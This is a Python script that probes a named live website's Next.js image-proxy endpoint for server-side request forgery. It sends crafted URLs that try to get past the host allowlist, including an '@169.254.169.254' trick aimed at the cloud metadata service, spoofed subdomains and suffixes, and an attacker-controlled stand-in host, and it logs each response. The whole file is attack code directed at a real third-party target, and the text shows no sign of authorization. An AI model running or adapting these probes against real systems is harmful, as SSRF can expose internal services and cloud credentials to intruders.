import requests
UA={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'}
base='https://www.infinitycapital.bh/_next/image'
# same allowlisted host, but a NON-image path -> if rejected, rejection is content/format based not host;
# if it fetches, rejection of others is HOST based (pre-fetch allowlist) => SSRF is blocked at edge.
ct='images.ctfassets.net'
tests={
 'allowlisted_host_valid_img':'https://'+ct+'/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg',
 'allowlisted_host_nonimg':'https://'+ct+'/totally-nonexistent-path-xyz-12345.jpg',
 'cdn_contentful_host':'https://'+'cdn.contentful.com'+'/foo.jpg',
 'evil_host':'https://'+'attacker-controlled.example.invalid'+'/a.jpg',
 'no_scheme':'//'+ct+'/a.jpg',
 'bypass_attempt_at':'https://'+ct+'@169.254.169.254/a.jpg',
 'bypass_subdomain':'https://evil.'+ct+'/a.jpg',
 'bypass_suffix':'https://'+ct+'.evil.invalid/a.jpg',
}
for name,u in tests.items():
    try:
        r=requests.get(base,params={'url':u,'w':'640','q':'75'},headers=UA,timeout=25,allow_redirects=False)
        print(f"{name:28} code={r.status_code} len={len(r.content):7} ct={r.headers.get('content-type','?')[:30]}")
    except Exception as e:
        print(f"{name:28} ERROR {type(e).__name__} {str(e)[:60]}")
